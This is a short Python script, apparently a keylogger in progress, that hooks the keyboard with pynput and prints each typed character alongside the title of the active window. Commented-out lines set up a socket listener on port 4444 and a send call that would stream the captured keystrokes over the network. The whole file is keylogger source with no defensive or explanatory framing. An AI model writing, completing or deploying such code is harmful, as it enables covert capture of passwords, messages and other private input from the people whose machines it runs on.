import pygetwindow as gw
from pynput import keyboard
import socket

print(gw.getActiveWindow().title)
# HOST = 'localhost'
# PORT = 4444
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#     s.bind((HOST, PORT))
#     s.listen()
#     conn, addr = s.accept()
#     print('Connected by', addr)

def on_press(key):
    try:
        # print(key.char,sep=' ',end='',flush=True)
        print(f'{gw.getActiveWindow().title} : {key.char}')
        # conn.send(key.char.encode())
    except AttributeError:
        # print(key)
            pass
    if str(key) == 'Key.esc':
        exit()


    
with keyboard.Listener(on_press=on_press) as listener :
    listener.join()